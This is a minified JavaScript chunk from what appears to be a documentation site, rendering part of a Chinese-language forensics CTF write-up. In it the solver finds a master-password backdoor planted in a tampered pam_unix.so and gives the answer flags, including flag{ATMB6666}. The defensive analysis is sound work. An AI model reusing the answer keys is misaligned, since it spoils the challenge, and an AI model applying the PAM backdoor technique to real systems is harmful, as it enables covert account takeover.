b0f531b39d88d4f603fc89bd4dd2c0aa\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{b0f531b39d88d4f603fc89bd4dd2c0aa}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"11",children:"11"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsxs)(n.p,{children:["\u9ed1\u5ba2 3s \u8bbe\u7f6e\u4e86\u4e00\u4e2a\u4e07\u80fd\u5bc6\u7801\u540e\u95e8\u4f7f\u5f97\u8fd9\u4e00\u4e2a\u4e07\u80fd\u5bc6\u7801\u53ef\u4ee5\u4ee5\u6240\u6709\u7528\u6237\u8eab\u4efd\u767b\u9646\uff0c\u4e5f\u4e0d\u5f71\u54cd\u539f\u6765\u5bc6\u7801\u4f7f\u7528\u3002\u8bf7\u53d1\u73b0\u8fd9\u4e2a\u4e07\u80fd\u5bc6\u7801\uff0c\u63d0\u4ea4 flag \u683c\u5f0f\u4e3a ",(0,c.jsx)(n.code,{children:"flag{\u4e07\u80fd\u5bc6\u7801}"})]}),"\n"]}),"\n",(0,c.jsxs)(n.p,{children:["\u7ed3\u5408\u4e07\u80fd\u5bc6\u7801\uff0c\u60f3\u5230\u653b\u51fb\u8005\u53ef\u80fd\u7be1\u6539\u4e86 ",(0,c.jsx)(n.code,{children:"pam_unix.so"})," \u6587\u4ef6"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:'(remote) root@ip-10-0-10-7:/root# find / -name "pam_unix.so"\n/usr/lib/x86_64-linux-gnu/security/pam_unix.so\n'})}),"\n",(0,c.jsxs)(n.p,{children:["\u53cd\u7f16\u8bd1\u5206\u6790\uff0c\u5b9a\u4f4d\u5230 ",(0,c.jsx)(n.code,{children:"pam_sm_authenticate"})," \u51fd\u6570"]}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"img",src:s(77570).Z+"",width:"1894",height:"1196"})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{ATMB6666}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,l.a)(),...e.components};return n?(0,c.jsx)(n,{...e,children:(0,c.jsx)(t,{...e})}):t(e)}},78546:(e,n,s)=>{s.d(n,{Z:()=>c});const c=s.p+"assets/images/image_20241124-102448-921dcb54e92b6a8a9592d0911a736f3b.png"},77570:(e,n,s)=>{s.d(n,{Z:()=>c});const c=s.p+"assets/images/image_20241156-105624-e0d6183e3e4268d60131430d43c800ca.png"},11151:(e,n,s)=>{s.d(n,{Z:()=>d,a:()=>a});var c=s(67294);const l={},r=c.createContext(l);function a(e){const n=c.useContext(r);return c.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:a(e.components),c.createElement(r.Provider,{value:n},e.children)}}}]);